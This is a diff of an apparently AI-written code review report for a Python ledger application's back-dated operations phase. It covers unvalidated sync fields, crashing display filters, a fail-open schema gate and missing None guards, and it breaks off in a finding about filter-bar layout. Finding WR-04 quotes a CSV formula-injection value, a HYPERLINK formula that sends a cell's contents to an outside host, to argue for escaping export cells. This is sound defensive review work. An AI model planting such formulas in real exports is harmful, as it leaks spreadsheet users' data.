@@ -1,7 +1,8 @@
 ---
 phase: 33-back-dated-operations
-reviewed: 2026-09-04T12:00:00Z
+reviewed: 2026-09-05T00:00:00Z
 depth: standard
+iteration: 2
 files_reviewed: 96
 files_reviewed_list:
   - alembic/versions/0027_ledger_business_date_and_reversal_links.py
@@ -102,518 +103,740 @@ files_reviewed_list:
   - tests/test_writeoffs.py
 findings:
   critical: 1
-  warning: 8
-  info: 6
-  total: 15
+  warning: 9
+  info: 8
+  total: 18
 status: issues_found
 ---
 
 # Phase 33: Code Review Report
 
-**Reviewed:** 2026-09-04T12:00:00Z
+**Reviewed:** 2026-09-05
 **Depth:** standard
-**Files Reviewed:** 96
 **Status:** issues_found
+**Iteration:** 2 (re-review after `33-REVIEW-FIX.md`)
 
 ## Summary
 
-Phase 33 adds an operator-supplied business date to both append-only ledgers
-(`operations`, `cash_movements`), a tz-correct backfill migration (0027), a
-dual-dialect trigger rewrite, one shared write-side validator (`parse_op_date`),
-one shared read-side expression (`business_date_expr`), and it switches the whole
-period-scoped read family (reports, finance, dashboard, history, exports,
-customer/warehouse aggregates) from `created_at` timestamps to date-only closed
-bounds.
+### Verification of iteration 1
 
-The write side and the migration are the strongest parts of the change. The
-single-write-path invariant holds: all fourteen surfaces route through
-`parse_op_date` → `record_operation` / `record_cash_movement`, and the two
-multi-row writers (`sales.register_sale`, `returns.register_return`,
-`transfers.register_transfer`, `receipts.register_receipt`) each resolve the
-today-fallback exactly once and thread one string into every row they write, so
-goods and money cannot land on different days. Migration 0027 orders
-add-column → backfill → trigger-rewrite correctly, uses bound parameters only,
-imports no app code, and its downgrade restores the guards before dropping the
-columns. The read side is consistent: `local_day_bounds_utc` has no remaining
-production caller, and every switched predicate uses the CLOSED `>=`/`<=` form.
+Seven of the eight fixes claimed in `33-REVIEW-FIX.md` were verified in the current
+code and are **not** re-reported:
 
-The central defect is on the boundary the phase's own threat register never
-looked at. `business_date` was added to two tables that the sync merge engine
-inserts into **verbatim from the wire**, and it is rendered by `format_ru_date`,
-which raises on anything that is not an ISO date. Nothing between the network
-and that filter validates the value, and the append-only triggers make a poisoned
-row impossible for the application to repair. `T-33-19` only proves the string
-`business_date` does not *appear* in the three sync modules — which is exactly
-why nobody checked what the sync path *carries*.
+| Prior | Verified at | Verdict |
+|---|---|---|
+| CR-01 (wire `business_date`) | `merge.py:92-97,147-166,250-262`; `core.py:96-110` | genuinely fixed for `business_date` |
+| WR-02 (`push_schema_ok` TypeError) | `sync.py:282-286`; `merge.py:280-286` | crash fixed; see WR-02 below for what the fix broke |
+| WR-03 (409 echo) | `routes/sync.py:61-66,150-160` | fixed (residual nit → IN-07) |
+| WR-04 (naive `created_at`) | `operations.py:145-155` | fixed inside `_is_backdated`; see CR-01 below for the layer it did not reach |
+| WR-06 (`isascii()`) | `receipts.py:125` | fixed |
+| WR-07 (`StopIteration`) | `sales.py:220-229` | fixed in `sales.py`; identical shape still live in `returns.py`/`transfers.py` → WR-05/WR-06 |
+| WR-08 (downgrade DDL asserted) | `tests/test_migrations.py:107-128` | fixed |
 
-Secondary themes: `parse_op_date` bounds the future but not the past;
-`push_schema_ok` (new this phase) crashes on a non-string header field and
-reflects that field back to the caller; and the `dated` filter's documented
-UTC-vs-local trade-off is only reasoned through in one of its two directions.
+Still open and re-stated against current line numbers: **WR-01** (skipped, needs an
+operator decision) and the behavioural half of the prior **WR-05** (now WR-09), plus
+**IN-01..IN-06** which were declared out of scope.
+
+### New this iteration
+
+The central new finding is that the CR-01 remediation was applied one column too
+narrowly. The fix hardened `format_ru_date` (`| ru_date`) and added a wire gate for
+`business_date`, and the WR-04 fix added a naive/unparseable guard inside
+`_is_backdated` — with an in-code comment stating plainly that a merged
+`created_at` "is not guaranteed to" be well-formed. But `created_at` itself is still
+merged verbatim with no validation, and its display filter `iso_to_local`
+(`| local_dt`) still **raises** and still reads a naive value in the **machine's OS
+zone**. That filter renders on `/history`, `/m/history`, both CSV dumps and eight
+other surfaces, two lines away from the code that was hardened. That is CR-01.
+
+Three further new findings are the same "fixed here, not there" pattern: the date
+gate covers `business_date` but not `Batch.expiry` on the same wire (WR-03); the
+`StopIteration` fix landed in `sales.py` but the same unguarded dereference is live
+in `returns.py` and `transfers.py` (WR-05, WR-06); and the WR-02 fix's two halves
+cancel each other so the composed system fails OPEN while the docstring claims
+fail-closed (WR-02).
+
+Findings that would contradict an explicit phase decision are **not** raised: the
+`created_at`-keeps-display-order rule (D-22), the read-side UTC-prefix fallback vs the
+tz-correct backfill (D-24/`business_date_expr`), «Когда» becoming the business date in
+CSV (D-23), `stale_products` staying on `created_at` (D-25), and the two-idiom mobile
+date placement (D-11) are all correct as decided.
+
+---
+
+## Narrative Findings (AI reviewer)
 
 ## Critical Issues
 
-### CR-01: `business_date` is inserted verbatim from the sync wire and rendered by a raising filter, on a table that can never be repaired
+### CR-01: `| local_dt` still raises on a wire-supplied `created_at`, and reads a naive one in the OS zone — the exact defect the CR-01/WR-04 fixes closed one layer away
 
 **Severity:** BLOCKER
+
 **Files:**
-- `app/models.py:420` and `app/models.py:587` (the two new columns — nullable `String(10)`, no CHECK)
-- `app/services/merge.py:451-462` (`_ledger_row` — `{column: data.get(column) for column in KIND_TO_FIELDS[kind]}`)
-- `app/services/merge.py:203-222` (`parse_exchange` validates `id`, `seq` and every `*_cents` field — and nothing else)
-- `app/core.py:89-99` (`format_ru_date`, the `| ru_date` filter, raises `ValueError`)
-- `app/services/operations.py:107-115`, `app/templates/partials/history_rows.html:157`, `:282`, `app/templates/mobile_partials/history_cards.html:40`
-- `app/services/export.py:174`, `:260`
-- `app/services/warehouses.py:117-118` + `app/templates/partials/warehouse_rows.html:83`
-- `app/services/customers.py:565-569` + `app/templates/partials/customer_insights.html`
-- `app/routes/returns.py:66` + `app/templates/partials/return_form.html`
+- `app/core.py:113-116` (`iso_to_local` — no `try`, `astimezone()` on a possibly naive value)
+- `app/routes/__init__.py:201-203` (the `local_dt` filter registration)
+- `app/services/merge.py:90` (`_LEDGER_REQUIRED` — `created_at` checked for `is not None` and nothing else)
+- `app/services/merge.py:503-514` (`_ledger_row` copies it verbatim into the bulk INSERT)
+- `app/templates/partials/history_rows.html:158`, `:160`, `:283`, `:285`
+- `app/templates/mobile_partials/history_cards.html:40`, `:42`
+- `app/services/export.py:185`, `:265`
+- plus `pages/home.html:61`, `partials/purchase_history.html:22`, `recent_sales.html:26`, `receipt_rows.html:24`, `cash_history_rows.html:45`, `ledger_rows.html:23`, `price_history.html:17`, `mobile_partials/cash_history_cards.html:26`
 
 **Issue:**
-`parse_exchange` type-checks money fields (`isinstance(value, int)`, bool excluded)
-and `seq`, precisely because SQLite's dynamic typing would otherwise store a string
-in an `Integer` column. The two `business_date` columns added by this phase get no
-such check. `_ledger_row` copies every key the model declares straight into
-`session.execute(insert(model), rows)`, so a pushed record carrying
-`"business_date": "не дата"` (or `"2026/09/04"`, or `12345`, or a 4 KB string) is
-stored as-is.
 
-The read path then hits it:
+The iteration-1 fixes established two rules and then applied each to only one of the
+two ledger timestamp columns:
+
+1. `format_ru_date` was made total — *"display code must not blow up on stored data …
+   the ledger is append-only: a single unparseable value … would otherwise turn every
+   one of those pages into a permanent 500 that the application cannot repair"*
+   (`app/core.py:96-103`).
+2. `_is_backdated` was given both a naive branch and an unparseable branch
+   (`app/services/operations.py:145-155`), with the comment *"a row MERGED from
+   another client is not guaranteed to [carry an offset]: `merge._LEDGER_REQUIRED`
+   only checks `created_at is not None`"* and *"A timestamp this function cannot parse
+   must not 500 /history — the ledger is append-only, so such a row cannot be
+   repaired."*
+
+Both statements are true. Neither was applied to `iso_to_local`, which is the filter
+that renders **the same column, on the same rows, on the same pages**:
 
 ```python
-# app/services/operations.py:107-115
-if op.business_date is None:
-    return False
-local_day = datetime.fromisoformat(op.created_at).astimezone(tz).date().isoformat()
-return op.business_date != local_day        # "не дата" != "2026-09-04" -> True
+# app/core.py:113-116 — unchanged this phase
+def iso_to_local(iso_str: str, tz_name: str) -> str:
+    moment = datetime.fromisoformat(iso_str)          # ValueError on junk
+    return moment.astimezone(ZoneInfo(tz_name)).strftime("%d.%m.%Y %H:%M")
 ```
 
-`is_backdated=True` routes the row into the branch that renders
-`{{ r.business_day | ru_date }}` → `date.fromisoformat("не дата")` → `ValueError`
-→ HTTP 500. The same value also reaches `format_ru_date` unguarded in both CSV
-exports (`export.py:174`, `:260`), in the warehouse list (`MAX()` over ISO strings
-happily returns `"не дата"`, which sorts above every real date), in the customer
-detail tile (`last_order_date` is a `MAX()` over the same expression), and in the
-return form's origin line.
+Executed (this machine, `Europe/Moscow` target):
 
-Two properties turn a bad row into a permanent outage rather than a bad cell:
-
-1. `operations_no_update` / `operations_no_delete` (`app/db.py:48-100`,
-   `alembic/versions/0027…py:122-167`) mean the application cannot UPDATE or
-   DELETE the row. There is no сторно path either — `reverses_op_id` ships unused
-   until Phase 34. Repair requires dropping the trigger by hand in `sqlite3`/`psql`.
-2. `/history`, `/m/history`, `/warehouses`, the customer detail page and both CSV
-   dumps break for **all** rows, not just the poisoned one.
-
-Preconditions: a valid device token (`require_device`) and a push. That is not an
-anonymous-internet vulnerability, but it is exactly the fleet-of-clients scenario
-this column was designed for — and it does not require malice: a client whose
-`display_tz` or clock produces an unexpected string, a hand-built offline bundle,
-or a future format change all reach the same place. `sales.csv`/`cash_movements.csv`
-have no `try` at all; `/history` has none either.
-
-**Fix:** validate at the parse boundary (where the money check already lives) and
-harden the display filter. Both, not one:
-
-```python
-# app/services/merge.py — beside the _money_fields loop in parse_exchange
-_DATE_FIELDS: frozenset[str] = frozenset({"business_date"})
-
-for date_key in _DATE_FIELDS & KIND_TO_FIELDS.get(kind, frozenset()):
-    value = data.get(date_key)
-    if value is None:
-        continue
-    if not isinstance(value, str):
-        raise ValueError(f"date field {date_key!r} must be an ISO yyyy-mm-dd string")
-    try:
-        if date.fromisoformat(value).isoformat() != value:
-            raise ValueError
-    except ValueError as exc:
-        raise ValueError(f"date field {date_key!r} must be an ISO yyyy-mm-dd string") from exc
+```
+iso_to_local("не дата", "Europe/Moscow")            -> ValueError: Invalid isoformat string
+iso_to_local("2026-08-31T21:30:00", "Europe/Moscow") -> "31.08.2026 22:30"
 ```
 
+The second line is the WR-04 bug, unfixed: the correct answer under
+`0027._local_business_date`'s own rule (naive is UTC) is `01.09.2026 00:30`. The value
+printed is whatever the **server's OS zone** produces — so the muted subline
+`задним числом · внесено {{ r.op.created_at | local_dt }}`
+(`history_rows.html:158`) can contradict the business date printed directly above it,
+and `_is_backdated` and the timestamp beside it can disagree about which day the row
+was entered.
+
+The first line is a permanent, unrepairable 500. `created_at` reaches the DB the same
+way `business_date` did before the CR-01 gate:
+
 ```python
-# app/core.py::format_ru_date — display code must not 500 on stored data
-def format_ru_date(iso: str | None) -> str:
-    if not iso:
+# app/services/merge.py:233-236
+if kind in _LEDGER_KINDS:
+    for required in _LEDGER_REQUIRED:          # ("device_id","seq","created_at","created_by")
+        if data.get(required) is None:         # <- presence only, no shape check
+            raise ValueError(...)
+```
+
+`_ledger_row` then copies it into `session.execute(insert(model), rows)`. Once
+stored, `operations_no_update` / `operations_no_delete` (`app/db.py:48-100`,
+`0027:122-167`) make the row unrepairable by the application, and `reverses_op_id`
+ships unused until Phase 34. One poisoned row takes down **all** rows on `/history`,
+`/m/history`, `/`, the customer purchase-history tab, and both CSV dumps
+(`export.py:185`, `:265` — neither has a `try`).
+
+Preconditions are identical to the ones the accepted CR-01 finding rested on: a valid
+device token and a push. The same reachability argument that justified fixing
+`business_date` applies verbatim here, and is quoted in the code.
+
+There is a second-order consequence worth stating, because it is the one that cannot
+be undone. Migration 0027's backfill falls back to `created_at[:10]`
+(`0027:307-310`) — so a row that was merged with `created_at = "не дата"` **before**
+0027 ran now carries `business_date = "не дата"`, and the new CR-01 parse gate will
+reject the entire NDJSON batch containing it with `400 MALFORMED_BATCH_ERROR`
+(`routes/sync.py:123-126`) on every future push, forever. Validating `created_at` at
+the same boundary closes the intake; it does not repair an already-backfilled row, so
+the follow-up revision in IN-03 should cover both columns.
+
+**Fix:** apply the two rules already written down, to the sibling column. Both parts:
+
+```python
+# app/core.py — mirror format_ru_date's NEVER-RAISES contract and 0027's naive rule
+def iso_to_local(iso_str: str | None, tz_name: str) -> str:
+    """Convert a UTC ISO-8601 string to local display time: '08.07.2026 15:00'.
+
+    NEVER RAISES (CR-01, 33-REVIEW iteration 2) — same rule as `format_ru_date`.
+    A naive value is read as UTC, never as the machine's OS zone: identical to
+    `alembic/versions/0027…::_local_business_date` and
+    `operations._is_backdated`, which this filter is rendered beside.
+    """
+    if not iso_str:
         return ""
     try:
-        return date.fromisoformat(iso).strftime("%d.%m.%Y")
+        moment = datetime.fromisoformat(iso_str)
     except (TypeError, ValueError):
-        return str(iso)          # render it, never crash the page
+        return str(iso_str)
+    if moment.tzinfo is None:
+        moment = moment.replace(tzinfo=UTC)
+    return moment.astimezone(ZoneInfo(tz_name)).strftime("%d.%m.%Y %H:%M")
 ```
 
-Add a regression test alongside `tests/test_business_date.py:601-628` (which
-already inserts a merge-shaped row bypassing `record_operation`): push
-`business_date="не дата"` through `parse_exchange` and assert it is refused, and
-assert `format_ru_date` on a junk value returns rather than raises.
+```python
+# app/services/merge.py — beside _DATE_FIELDS; created_at is a TIMESTAMP, not a date,
+# so it needs its own check rather than an entry in _DATE_FIELDS.
+_TIMESTAMP_FIELDS: frozenset[str] = frozenset({"created_at"})
+
+def _is_iso_timestamp(value: object) -> bool:
+    if not isinstance(value, str):
+        return False
+    try:
+        datetime.fromisoformat(value)
+    except ValueError:
+        return False
+    return True
+
+# ...inside the `if kind in _LEDGER_KINDS:` block, after the seq check:
+for ts_key in _TIMESTAMP_FIELDS & KIND_TO_FIELDS.get(kind, frozenset()):
+    if not _is_iso_timestamp(data.get(ts_key)):
+        raise ValueError(f"timestamp field {ts_key!r} must be an ISO-8601 string")
+```
+
+Regression tests to add beside `tests/test_history.py:743-781` (which already builds
+the fixture shape): assert `iso_to_local` returns rather than raises on
+`"не дата"`; assert `iso_to_local("2026-08-31T21:30:00", "Europe/Moscow") ==
+"01.09.2026 00:30"` (this one is only discriminating off a UTC host — assert the
+correct answer either way, as `test_is_backdated_reads_a_naive_created_at_as_utc`
+does); and assert `parse_exchange` refuses a ledger record whose `created_at` is
+`"не дата"`, `12345`, `None`-adjacent junk or a bare date.
+
+---
 
 ## Warnings
 
-### WR-01: `parse_op_date` bounds the future but not the past
+### WR-01: `parse_op_date` still bounds the future but not the past (unfixed from iteration 1)
 
-**File:** `app/services/ledger.py:62-73`; forms at
-`app/templates/partials/receipt_form.html:110`, `correction_form.html:113`,
-`sale_form.html:107`, `transfer_form.html:83`, `writeoff_form.html:97`,
-`withdraw_form.html:87`, `deposit_form.html:73`,
-`mobile_partials/transfers_step_dest.html:99`, `mobile_pages/*.html`
+**Severity:** WARNING
+**File:** `app/services/ledger.py:62-73`; the 14 date inputs all carry `max=` and none carries `min=` (`partials/receipt_form.html:109-110`, `sale_form.html:106-107`, `writeoff_form.html:96-97`, `correction_form.html:112-113`, `transfer_form.html:82-83`, `return_form.html:62-63`, `withdraw_form.html:86-87`, `deposit_form.html:72-73`, `mobile_pages/{receipts,sales,writeoff}.html`, `mobile_partials/{corrections_step_value,transfers_step_dest,return_confirm}.html`)
 
-**Issue:** the validator refuses `> today` and accepts everything else, and every
-`<input type="date">` carries `max=` but no `min=`. A single mis-typed year
-(`0226-09-04`, trivially produced by typing into the year segment of a native date
-picker) is accepted, written, and then invisible to every period report — while the
-ledger's append-only triggers make it uncorrectable until Phase 34 ships сторно.
-The docstring reasons at length about the upper boundary and never mentions the
-lower one.
-
-**Fix:** add a floor to the single validator and a matching `min=` to the inputs:
+**Issue:** unchanged since iteration 1, deliberately skipped there pending an operator
+decision. Verified still live:
 
 ```python
-# app/services/ledger.py
-OP_DATE_TOO_OLD_ERROR = "Дата операции слишком давняя."
-_OP_DATE_FLOOR_DAYS = 3650          # ~10 years; pick with the operator
-
-...
 if parsed.isoformat() > local_today_iso(settings.display_tz):
     errors[key] = OP_DATE_FUTURE_ERROR
     return None
-if (date.fromisoformat(local_today_iso(settings.display_tz)) - parsed).days > _OP_DATE_FLOOR_DAYS:
-    errors[key] = OP_DATE_TOO_OLD_ERROR
-    return None
+return parsed.isoformat()
 ```
 
-### WR-02: `push_schema_ok` raises `TypeError` (raw 500) on a non-string `schema_version`
+A mistyped year is accepted: `"0226-09-04" > "2026-09-05"` is `False` because `'0' <
+'2'`, so the value is written. The row is then invisible to every period report, and
+the append-only triggers plus the absence of сторно (Phase 34) make it uncorrectable.
+`date.fromisoformat` requires a 4-digit year, so the reachable range is
+`0001-01-01 … today` — roughly 2000 years of accepted garbage.
 
-**Files:** `app/services/sync.py:273-275`, `app/routes/sync.py:136-143`,
-`app/services/merge.py:231`
+**Fix:** unchanged from iteration 1 and still blocked on the same two decisions —
+(a) what the oldest enterable date is, (b) the third RU error string, which
+`33-UI-SPEC.md` § Copywriting Contract does not contain. **Recommended next step:**
+put both questions to the operator in one pass, then land floor + string + `min=` as a
+single change with the spec updated alongside. Do not ship the `min=` template half
+alone: it is a browser hint on a field that is re-validated server-side precisely
+because form values are untrusted, and shipping it would make the hole look closed.
 
-**Issue:** `parse_exchange` stores `header.get("schema_version") or ""` with no type
-check, so a pushed header `{"kind":"header","format_version":1,"schema_version":5}`
-yields an `int`. `push_schema_ok` then evaluates `5 <= "0027"` →
-`TypeError: '<=' not supported between instances of 'int' and 'str'`, which nothing
-catches: the route's `try` blocks cover only `parse_exchange` (step 4). The result
-is an unhandled 500 from a route whose whole design note is "never echo, never
-crash". A JSON list or dict produces the same crash.
+### WR-02: the WR-02 fix's two halves cancel — the schema gate fails OPEN while its docstring claims fail-closed
 
-**Fix:** coerce/validate at the parse boundary and make the predicate total:
+**Severity:** WARNING
+**Files:** `app/services/merge.py:280-286`, `app/services/sync.py:282-286`, `app/routes/sync.py:150-160`
+
+**Issue:** the fix landed two changes that are individually sound and jointly
+self-defeating.
 
 ```python
-# app/services/merge.py:231
+# merge.py:280-283 — runs FIRST
 raw_schema = header.get("schema_version")
-schema_version = raw_schema if isinstance(raw_schema, str) else ""
+... schema_version=raw_schema if isinstance(raw_schema, str) else "", ...
 ```
 
 ```python
-# app/services/sync.py::push_schema_ok
+# sync.py:282-286 — runs SECOND, on the already-coerced value
 if not isinstance(client_schema, str) or not isinstance(server_schema, str):
-    return False            # an untyped/absent version is not "acceptable"
+    return False            # <- unreachable from the only production caller
 if not client_schema or not server_schema:
-    return True
-return client_schema <= server_schema
+    return True             # <- this is the branch a non-string actually takes
 ```
 
-### WR-03: the 409 schema-gate detail reflects client-controlled bytes, contradicting its own comment
+`routes/sync.py:151` is the sole production caller of `push_schema_ok`, and it can
+only ever be handed `batch.schema_version`, which `parse_exchange` has already
+coerced. So the `isinstance` guard is dead code, and a header carrying
+`"schema_version": 27` (or a list, or a dict) degrades to `""` → D-03 escape hatch →
+**push accepted**. Meanwhile the docstring at `sync.py:273-280` asserts the opposite:
 
-**File:** `app/routes/sync.py:134-143` (comment at `:134-135`, format at `:140-142`)
+> A non-string version is not «acceptable» — it is refused (False), which is the
+> fail-closed direction
 
-**Issue:** the in-code claim is "only the two Alembic revision ids are interpolated
-into the detail — never submitted bytes". `batch.schema_version` **is** submitted
-bytes: it comes straight from the pushed NDJSON header, unvalidated (WR-02), and
-unbounded in length within the 32 MB body cap. The response is JSON so this is not
-XSS, but it is an untrusted-echo policy violation and a response-amplification
-vector, and — worse — the comment will stop the next reader from checking.
+That sentence is false for every path that exists. The consequence is small in
+practice (our own client always sends a string from `current_schema_version`), but the
+gate exists exactly to catch a client whose header is not what we assume, and a
+reader — or a Phase 34 author adding a second caller — will trust the docstring.
 
-**Fix:** echo only the server's own revision, or truncate and character-class the
-client half:
+**Fix:** pick one direction and make the code and the prose agree. The narrow,
+behaviour-preserving option is to correct the prose and delete the dead branch:
 
 ```python
-client_shown = batch.schema_version if re.fullmatch(r"\d{4}", batch.schema_version or "") else "?"
-raise HTTPException(
-    status_code=409,
-    detail=SCHEMA_AHEAD_ERROR.format(client=client_shown, server=server_schema),
-)
+def push_schema_ok(client_schema: str, server_schema: str) -> bool:
+    """...
+    WR-02 (33-REVIEW): `parse_exchange` coerces a non-string wire
+    `schema_version` to "" at the parse boundary (merge.py:280-283), so an
+    UNTYPED version reaches this predicate as "" and is ACCEPTED via the D-03
+    escape hatch — exactly like a header that omits the field. That is
+    deliberate; this predicate is not the type gate.
+    """
+    if not client_schema or not server_schema:
+        return True
+    return client_schema <= server_schema
 ```
-Update the comment to say what the code actually does.
 
-### WR-04: `_is_backdated` reads a naive `created_at` as server-local time, not UTC
+The fail-closed option is to stop coercing in `parse_exchange` and instead
+`raise ValueError` on a non-string `schema_version` there, beside the money and date
+checks — but that turns a malformed header into `400 MALFORMED_BATCH_ERROR`, so pick
+it only if that is wanted. Whichever is chosen, update
+`tests/test_sync_schema_gate.py`'s end-to-end assertion (which currently pins 200) and
+its docstring so the pin states the composed behaviour, not the predicate's.
 
-**File:** `app/services/operations.py:114`
+### WR-03: the new date gate covers `business_date` only — `Batch.expiry`, the other `String(10)` ISO date on the same wire, is still unvalidated
+
+**Severity:** WARNING
+**Files:** `app/services/merge.py:92-97` (`_DATE_FIELDS`), `app/models.py:264-266` (`Batch.expiry`), `app/services/merge.py:356-369` (`_reference_row` copies every mapper column verbatim), `app/templates/pages/reports_expiry.html:29` + `mobile_pages/reports_expiry.html:12`, `app/services/batches.py` (`expiring_batches`)
+
+**Issue:** the CR-01 fix's own comment says:
+
+```python
+# app/services/merge.py:92-97
+# CR-01 (33-REVIEW): date-typed wire columns. Named EXPLICITLY rather than
+# derived from a `_date` suffix — ... Add the next date-only column here when
+# one appears.
+_DATE_FIELDS: frozenset[str] = frozenset({"business_date"})
+```
+
+The next date-only column has already appeared — it shipped in Phase 9.
+`Batch.expiry` is `mapped_column(String(10))` holding ISO `yyyy-mm-dd`
+(`models.py:264-266`), `batch` is one of the six reference kinds carried over the wire
+(`merge.py:302-309`), and `_reference_row` copies every declared column straight from
+the payload with no shape check. Consequences of a pushed `"expiry": "не дата"`:
+
+- `expiring_batches` compares `Batch.expiry <= horizon` as a raw string, so the batch
+  sorts arbitrarily into or out of the expiry report;
+- `reports_expiry.html:29` and its mobile twin compare `row.batch.expiry < today` in
+  Jinja, same lexicographic accident;
+- `format_ru_date` renders it as-is — which is only *not* a 500 because of the CR-01
+  fix, i.e. the second layer is doing the first layer's job for this column.
+
+Batches are reference rows (upsertable, soft-deletable), so this is recoverable and
+therefore not a BLOCKER — but the gate is advertised as schema-tracking and it is not.
+
+**Fix:** one line, plus a test:
+
+```python
+# app/services/merge.py
+_DATE_FIELDS: frozenset[str] = frozenset({"business_date", "expiry"})
+```
+
+`_date_fields()` already intersects with `KIND_TO_FIELDS[kind]`, so no other change is
+needed. Add a `parse_exchange` refusal test for a `batch` record carrying
+`"expiry": "2026/09/04"` alongside the existing `business_date` cases in
+`tests/test_business_date.py`.
+
+### WR-04: CSV column 1 can now carry free text and is the one cell in the file not passed through `_csv_safe`
+
+**Severity:** WARNING
+**Files:** `app/services/export.py:174`, `:260`; contract stated at `:20-23` and `:51-55`
+
+**Issue:** the module docstring states the invariant:
+
+> T-06-10: `_csv_safe` prefixes any free-text value starting with `=`, `+`, `-`, or
+> `@` with a leading apostrophe so Excel never interprets it as a formula on open
+
+Before this phase column 1 was `iso_to_local(...)`, which can only ever produce
+`dd.mm.yyyy HH:MM` — genuinely not free text, so leaving it unwrapped was safe. This
+phase changed it to `format_ru_date(...)`, and the CR-01 fix then made
+`format_ru_date` return `str(iso)` verbatim on anything it does not recognise. Column
+1 is therefore now a **pass-through of stored bytes**, and it is unwrapped in both
+period-scoped exports:
+
+```python
+# app/services/export.py:174 and :260 — no _csv_safe
+format_ru_date(op.business_date or op.created_at[:10]),
+format_ru_date(movement.business_date or movement.created_at[:10]),
+```
+
+A stored `business_date` of `=HYPERLINK("http://x/"&A2,"click")` opens as a live
+formula in the operator's spreadsheet. The CR-01 parse gate makes that unreachable
+*today* — which is precisely the argument the CR-01 fix rejected when it hardened
+`format_ru_date` as a second layer. The same reasoning applies to the second layer
+here.
+
+**Fix:** wrap it, exactly like every other free-text cell in the file:
+
+```python
+_csv_safe(format_ru_date(op.business_date or op.created_at[:10])),
+```
+
+A well-formed date never starts with `=`/`+`/`-`/`@`, so no existing output changes
+by a single byte.
+
+### WR-05: `register_return` dereferences `batch` and `warehouse` with no None guard — the precondition WR-07's own fix documented
+
+**Severity:** WARNING
+**File:** `app/services/returns.py:175-179`
+
+**Issue:** WR-07 was fixed in `sales.py` with this justification, written into the code
+at `sales.py:220-226`:
+
+> The SELECT returns nothing when a picked batch points at a warehouse row that is
+> absent, which is reachable on a merged DB: `Batch.warehouse_id`'s FK is ORM-only on
+> the merge path and `PRAGMA foreign_keys` is set for SQLite connections only.
+
+The identical dereference is live one module away, unguarded:
+
+```python
+# app/services/returns.py:175-179
+batch_id = _resolve_or_create_return_batch_id(session, origin)
+batch = session.get(Batch, batch_id)              # None if origin.batch_id dangles
+warehouse = session.get(Warehouse, batch.warehouse_id)   # AttributeError
+... currency=warehouse.currency,                  # AttributeError
+```
+
+Both lookups can return `None` under exactly the precondition quoted above.
+`AttributeError` is not in the `except (ValueError,)` / `except IntegrityError`
+handlers at `:215-222`, so it escapes `register_return`. Both routes wrap the call in
+`except Exception` (`routes/returns.py:140`, `routes/mobile_returns.py`), so the user
+sees `SAVE_FAILED_ERROR` rather than a 500 — but the operator gets the wrong message
+and the server logs a `logger.exception` stack trace for what is a known data shape,
+which is the same complaint WR-06 raised about `register_receipt`.
+
+Note also that `warehouse` is resolved **unconditionally**, above the `if debit:`
+guard at `:199`, so a return of a zero-price sale fails for a currency it never uses.
+
+**Fix:**
+
+```python
+batch = session.get(Batch, batch_id)
+warehouse = session.get(Warehouse, batch.warehouse_id) if batch is not None else None
+if warehouse is None:
+    session.rollback()
+    return None, {"form": SAVE_FAILED_ERROR}
+```
+
+### WR-06: `register_transfer` dereferences `source_warehouse` with no None guard
+
+**Severity:** WARNING
+**File:** `app/services/transfers.py:122-125`
+
+**Issue:** the same shape, same precondition:
+
+```python
+dest_warehouse = session.get(Warehouse, dest_warehouse_id)      # safe: checked against active_ids at :115
+source_warehouse = session.get(Warehouse, source.warehouse_id)  # NOT checked — may be None
+if dest_warehouse.currency != source_warehouse.currency:        # AttributeError
+```
+
+`dest_warehouse_id` was verified to be in `active_ids` at `:113-116`, so
+`dest_warehouse` is safe. `source.warehouse_id` was never verified against anything —
+`source` is resolved by `session.get(Batch, batch_id)` and only its `product_id` is
+checked (`:107-109`). Caught by the routes' `except Exception`, so the visible result
+is the wrong RU message plus a spurious stack trace, not a 500.
+
+**Fix:**
+
+```python
+source_warehouse = session.get(Warehouse, source.warehouse_id)
+if source_warehouse is None:
+    return None, {"batch": BATCH_REQUIRED_ERROR}
+```
+
+### WR-07: `test_revision_ids_are_fixed_width` cannot see the filenames it exists to catch
+
+**Severity:** WARNING
+**File:** `tests/test_migrations.py:145-146`
+
+**Issue:** the test's own docstring names the failure it guards:
+
+> the moment one revision is named `9` or `0027a` or `abc123`, the ordering silently
+> stops meaning "newer than" … Nothing else in the repo enforces the shape, so this
+> regex is the enforcement.
+
+But the collection glob excludes exactly those files:
+
+```python
+paths = sorted(_VERSIONS_DIR.glob("[0-9]*.py"))
+assert len(paths) >= 26, f"revision glob found only {len(paths)} files"
+```
+
+Alembic's default template names a revision file `<rev>_<slug>.py`, so
+`alembic revision -m "..."` with an auto-generated hex id produces e.g.
+`a1b2c3d4e5f6_add_thing.py` — which `[0-9]*.py` does not match, and which therefore
+contributes nothing to `paths`. The `>= 26` floor still passes because the 27 legacy
+files are all still there. The one case the test is written for is the one case it
+silently skips, and `push_schema_ok`'s lexicographic comparison (`sync.py:266-271`)
+rests entirely on it.
+
+**Fix:** glob everything and let the regex do the work:
+
+```python
+paths = sorted(p for p in _VERSIONS_DIR.glob("*.py") if p.name != "__init__.py")
+assert len(paths) >= 27, f"revision glob found only {len(paths)} files"
+```
+
+Every non-conforming filename then reaches the `re.fullmatch(r"\d{4}", ...)` assertion
+and reddens, which is the stated intent. (Also prefer `[0-9]{4}` over `\d{4}` — see
+IN-07.)
+
+### WR-08: `.filter-bar` has no `flex-wrap` and this phase added a fourth `<select>` to it
+
+**Severity:** WARNING
+**Files:** `app/static/style.css:188-193`; `app/templates/partials/history_rows.html:24-82`
 
 **Issue:**
 
-```python
-local_day = datetime.fromisoformat(op.created_at).astimezone(tz).date().isoformat()
+```css
+.filter-bar {
+  display: flex;
+  gap: 16px;
+  align-items: flex-end;
+  margin-bottom: 24px;
+}
 ```
 
-`astimezone()` on a **naive** datetime interprets it in the *machine's* local zone.
-Locally written rows always carry an offset (`utcnow_iso`), but a row merged from
-another client is not guaranteed to (`_LEDGER_REQUIRED` only checks `created_at is
-not None`). Migration 0027 hit the same input and handled it explicitly:
+No `flex-wrap`, so the default `nowrap` applies. D-20 added a fourth control to this
+bar («Задним числом», `history_rows.html:71-81`) beside «Тип операции»,
+«Сортировать по» («Сначала новые (по умолчанию)» is a wide option) and
+«Пользователь». Four `<select>` elements plus 3×16 px gaps will exceed a 1024 px
+content column, and with `nowrap` the overflow is clipped or forces a horizontal
+scrollbar rather than wrapping — putting the phase's own new filter off-screen. The
+sibling `.toolbar` rule at `:72-77` already sets wrapping, so this is an
+inconsistency, not a new idiom.
 
-```python
-# alembic/versions/0027…py:311-314
-if moment.tzinfo is None:
-    moment = moment.replace(tzinfo=UTC)
+`needs verification`: open `/history` at 1024 px and check for a horizontal scrollbar
